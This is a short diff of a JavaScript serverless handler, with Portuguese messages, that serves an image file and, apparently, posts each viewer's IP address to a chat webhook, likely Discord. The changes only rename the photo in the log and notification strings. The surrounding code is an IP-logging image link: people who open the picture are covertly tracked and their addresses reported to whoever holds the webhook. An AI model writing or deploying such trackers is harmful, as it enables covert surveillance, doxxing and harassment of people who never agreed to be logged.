@@ -16,7 +16,7 @@ export default async function handler(req, res) {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        content: `📸 **foto-discord2.png** acessada!\n🌐 IP: ${ip}`
+        content: `📸 **foto** acessada!\n🌐 IP: ${ip}`
       })
     });
   } catch (e) {
@@ -32,7 +32,7 @@ export default async function handler(req, res) {
     
     // Verifica se existe
     if (!fs.existsSync(fotoPath)) {
-      console.log('❌ foto-discord2.png não encontrada!');
+      console.log('❌ foto não encontrada!');
       console.log('📁 Arquivos em public/:');
       
       // Lista o que tem na pasta public
@@ -48,7 +48,7 @@ export default async function handler(req, res) {
     res.setHeader('Cache-Control', 'no-cache');
     res.send(fotoBuffer);
     
-    console.log('✅ foto-discord2.png enviada!');
+    console.log('✅ foto enviada!');
     
   } catch (error) {
     console.log('❌ ERRO:', error.message);
